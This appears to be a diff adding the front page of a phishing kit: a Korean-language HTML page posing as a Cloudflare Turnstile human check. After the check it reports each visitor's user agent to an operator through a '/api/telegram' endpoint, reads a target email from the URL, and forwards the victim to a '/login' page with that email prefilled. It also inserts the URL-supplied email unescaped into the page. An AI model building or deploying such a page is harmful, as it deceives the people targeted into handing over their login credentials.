@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 보안 접근 확인</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Noto Sans KR', -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 480px;
+            width: 100%;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .icon { font-size: 56px; display: block; text-align: center; margin-bottom: 12px; }
+        h1 { color: #e2e8f0; font-size: 24px; text-align: center; margin-bottom: 4px; }
+        .subtitle {
+            color: #94a3b8;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .turnstile-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .cf-turnstile { transform: scale(0.9); }
+        .status-text {
+            text-align: center;
+            color: #94a3b8;
+            font-size: 13px;
+            margin-top: 12px;
+        }
+        .status-text .loading { color: #fbbf24; }
+        .status-text .success { color: #34d399; }
+        .status-text .error { color: #ef4444; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: white;
+            font-family: inherit;
+            margin-top: 16px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #a78bfa, #7c3aed);
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-primary.active {
+            opacity: 1;
+            cursor: pointer;
+        }
+        .btn-primary.active:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(167, 139, 250, 0.3);
+        }
+        .footer-text {
+            text-align: center;
+            color: #475569;
+            font-size: 12px;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .detection-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-family: monospace;
+            opacity: 0.4;
+            pointer-events: none;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 24px; }
+            .cf-turnstile { transform: scale(0.7); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <span class="icon">🛡️</span>
+        <h1>보안 접근 확인</h1>
+        <p class="subtitle">로봇이 아님을 확인해주세요</p>
+
+        <div class="turnstile-container">
+            <div class="cf-turnstile" 
+                 data-sitekey="0x4AAAAAAA-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+                 data-callback="onTurnstileSuccess"
+                 data-theme="dark">
+            </div>
+        </div>
+
+        <div class="status-text" id="statusText">
+            <span class="loading">⏳ 확인 대기 중...</span>
+        </div>
+
+        <button class="btn btn-primary" id="continueBtn" disabled>
+            🔓 계속하기
+        </button>
+
+        <div class="footer-text">
+            🔒 Cloudflare 보안 보호
+        </div>
+    </div>
+
+    <div class="detection-badge">🦎 v3.0</div>
+
+    <script>
+        const CONFIG = {
+            LOGIN_URL: '/login',
+            SESSION_KEY: 'chameleon_session'
+        };
+
+        const continueBtn = document.getElementById('continueBtn');
+        const statusText = document.getElementById('statusText');
+
+        let turnstileVerified = false;
+        let turnstileToken = null;
+
+        window.onTurnstileSuccess = function(token) {
+            turnstileVerified = true;
+            turnstileToken = token;
+            statusText.innerHTML = '<span class="success">✅ 인간 확인 완료!</span>';
+            continueBtn.classList.add('active');
+            continueBtn.disabled = false;
+
+            fetch('/api/telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    message: '🛡️ *CLOUDFLARE TURNSTILE VERIFIED*\n\n✅ Status: Verified\n🕐 Time: ' + new Date()
+                        .toLocaleString('ko-KR') + '\n🖥️ Device: ' + navigator.userAgent.substring(0, 60) + '...',
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+        };
+
+        window.onTurnstileError = function() {
+            statusText.innerHTML = '<span class="error">❌ 확인 실패. 다시 시도해주세요.</span>';
+            turnstileVerified = false;
+            continueBtn.classList.remove('active');
+            continueBtn.disabled = true;
+        };
+
+        window.onTurnstileExpired = function() {
+            statusText.innerHTML = '<span class="error">⏰ 확인 만료. 다시 시도해주세요.</span>';
+            turnstileVerified = false;
+            continueBtn.classList.remove('active');
+            continueBtn.disabled = true;
+        };
+
+        continueBtn.addEventListener('click', function() {
+            if (!turnstileVerified) return;
+
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email') || params.get('login_hint') || '';
+
+            const session = {
+                email: email,
+                turnstileVerified: true,
+                turnstileToken: turnstileToken,
+                verifiedAt: Date.now(),
+                expiresAt: Date.now() + 3600000
+            };
+            sessionStorage.setItem(CONFIG.SESSION_KEY, JSON.stringify(session));
+
+            window.location.href = CONFIG.LOGIN_URL + '?email=' + encodeURIComponent(email);
+        });
+
+        function checkSession() {
+            try {
+                const session = sessionStorage.getItem(CONFIG.SESSION_KEY);
+                if (session) {
+                    const data = JSON.parse(session);
+                    if (data.turnstileVerified && Date.now() < data.expiresAt) {
+                        const email = data.email || '';
+                        window.location.href = CONFIG.LOGIN_URL + '?email=' + encodeURIComponent(email);
+                        return true;
+                    }
+                }
+            } catch (e) {}
+            return false;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            if (checkSession()) return;
+
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email') || params.get('login_hint') || '';
+
+            if (email) {
+                const domain = email.split('@')[1] || '';
+                statusText.innerHTML = '<span style="color:#94a3b8;">📧 ' + email + ' (' + domain + ')</span>';
+            }
+
+            console.log('🛡️ Cloudflare Turnstile protection active');
+        });
+    </script>
+
+</body>
+</html>
